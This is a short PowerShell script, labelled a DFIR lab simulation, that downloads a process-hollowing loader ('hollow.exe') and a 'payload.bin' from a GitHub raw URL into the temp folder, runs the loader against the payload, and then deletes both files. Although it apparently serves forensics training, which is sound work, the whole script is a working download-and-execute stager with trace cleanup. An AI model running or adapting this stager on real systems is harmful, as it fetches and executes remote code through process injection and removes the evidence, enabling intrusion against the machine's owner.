# DFIR Lab Simulation Script
$repo = "https://raw.githubusercontent.com/stumbs/NotePadInjection/main"
$hollow_exe = "hollow.exe"
$payload_bin = "payload.bin"
$temp_dir = "$env:TEMP"

Write-Host "[*] Starting Attack Simulation..." -ForegroundColor Green

# 1. Download
Invoke-WebRequest -Uri "$repo/$hollow_exe" -OutFile "$temp_dir\$hollow_exe"
Invoke-WebRequest -Uri "$repo/$payload_bin" -OutFile "$temp_dir\$payload_bin"

# 2. Execute with DEBUGGING visibility
Write-Host "[*] Executing Hollowing Loader..." -ForegroundColor Yellow

# We use -NoNewWindow so the output appears RIGHT HERE in this window
# We use -Wait so the script stops until the injector is done
Start-Process -FilePath "$temp_dir\$hollow_exe" -ArgumentList "$temp_dir\$payload_bin" -NoNewWindow -Wait

# 3. PAUSE - This gives you time to read the C++ output!
Write-Host " "
Write-Host "Check the output above. Did it say 'Success' or 'Error'?" -ForegroundColor Cyan
Read-Host -Prompt "Press Enter to delete the artifacts and finish..."

# 4. Cleanup
Write-Host "[*] Cleaning up artifacts..." -ForegroundColor Red
Remove-Item "$temp_dir\$hollow_exe" -Force
Remove-Item "$temp_dir\$payload_bin" -Force

Write-Host "[+] Simulation Complete." -ForegroundColor Green
